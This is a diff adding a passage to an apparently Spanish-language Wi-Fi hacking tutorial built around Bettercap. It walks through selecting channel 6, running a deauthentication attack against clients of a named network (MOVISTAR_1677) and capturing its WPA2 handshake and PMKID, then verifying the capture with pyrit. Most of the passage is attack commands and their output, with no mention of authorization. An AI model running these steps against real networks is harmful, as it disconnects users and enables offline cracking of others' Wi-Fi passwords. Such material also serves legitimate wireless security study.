@@ -2199,6 +2199,75 @@ wlan0mon (ch. 40) / ↑ 0 B / ↓ 538 kB / 1392 pkts
  wlan0mon  »  
 ```
 
+Ahora bien, ¿cómo filtro el canal que me interesa?, sencillo... a través de la siguiente operación:
+
+```bash
+ wlan0mon  » wifi.recon.channel 6
+```
+
+Esto hará que ahora se nos listen las redes disponibles en el canal 6:
+
+```bash
+┌─────────┬───────────────────┬───────────────┬──────────────────┬─────┬────┬───────────┬────────┬───────┬──────────┐
+│  RSSI   │       BSSID       │     SSID      │    Encryption    │ WPS │ Ch │ Clients ▾ │  Sent  │ Recvd │   Seen   │
+├─────────┼───────────────────┼───────────────┼──────────────────┼─────┼────┼───────────┼────────┼───────┼──────────┤
+│ -94 dBm │ 50:78:b3:ee:bb:ac │ MIWIFI_psGP   │ WPA2 (CCMP, PSK) │ 2.0 │ 6  │           │        │       │ 21:18:09 │
+│ -53 dBm │ 1c:b0:44:d4:16:78 │ MOVISTAR_1677 │ WPA2 (CCMP, PSK) │ 2.0 │ 6  │           │ 3.4 kB │       │ 21:18:10 │
+└─────────┴───────────────────┴───────────────┴──────────────────┴─────┴────┴───────────┴────────┴───────┴──────────┘
+
+wlan0mon (ch. 6) / ↑ 0 B / ↓ 906 kB / 2889 pkts
+
+ wlan0mon  » wifi.recon.channel 6
+```
+
+¿Qué es lo cómodo de este método?, pues que por ejemplo yo ahora viendo que la red **MOVISTAR_1677** tiene el
+BSSID **1c:b0:44:d4:16:78**, podría hacer un ataque de de-autenticación sobre los clientes que **Bettercap**
+detecte en dicha red:
+
+```bash
+ wlan0mon  » wifi.deauth 1c:b0:44:d4:16:78
+```
+
+Obteniendo los siguientes resultados:
+
+```bash
+ wlan0mon  » wifi.deauth 1c:b0:44:d4:16:78
+ wlan0mon  » [21:33:26] [sys.log] [inf] wifi deauthing client 20:34:fb:b1:c5:53 from AP MOVISTAR_1677 (channel:6 encryption:WPA2)
+ ```
+
+ Una vez el cliente se reconecte a la red:
+
+ ```bash
+ wlan0mon  » [21:33:13] [wifi.client.probe] station da:a1:19:8b:d9:82 (Google, Inc.) is probing for SSID MOVISTAR_DF12 (-38 dBm)
+ wlan0mon  » [21:33:15] [wifi.client.probe] station 20:34:fb:b1:c5:53 is probing for SSID MOVISTAR_1677 (-40 dBm)
+ wlan0mon  » [21:33:15] [wifi.client.handshake] captured 20:34:fb:b1:c5:53 -> MOVISTAR_1677 (1c:b0:44:d4:16:78) RSN PMKID to /root/bettercap-wifi-handshakes.pcap
+ wlan0mon  » [21:33:15] [wifi.client.handshake] captured 20:34:fb:b1:c5:53 -> MOVISTAR_1677 (1c:b0:44:d4:16:78) WPA2 handshake to /root/bettercap-wifi-handshakes.pcap
+ ```
+
+ Se genera el Handshake y este es exportado automáticamente al fichero indicado desde el verbose de la
+ herramienta. Si analizamos con **pyrit**, vemos que efectivamente... se ha capturado un Handshake por parte
+ de dicha estación:
+
+ ```bash
+ ┌─[root@parrot]─[/opt/bettercap]
+└──╼ #pyrit -r /root/bettercap-wifi-handshakes.pcap analyze
+Pyrit 0.5.1 (C) 2008-2011 Lukas Lueg - 2015 John Mora
+https://github.com/JPaulMora/Pyrit
+This code is distributed under the GNU General Public License v3+
+
+Parsing file '/root/bettercap-wifi-handshakes.pcap' (1/1)...
+Parsed 7 packets (7 802.11-packets), got 1 AP(s)
+
+#1: AccessPoint 1c:b0:44:d4:16:78 ('MOVISTAR_1677'):
+  #1: Station 20:34:fb:b1:c5:53, 4 handshake(s):
+    #1: HMAC_SHA1_AES, good, spread 1
+    #2: HMAC_SHA1_AES, good, spread 1
+    #3: HMAC_SHA1_AES, good, spread 2
+    #4: HMAC_SHA1_AES, good, spread 2
+```
+
+
+
 
 
 
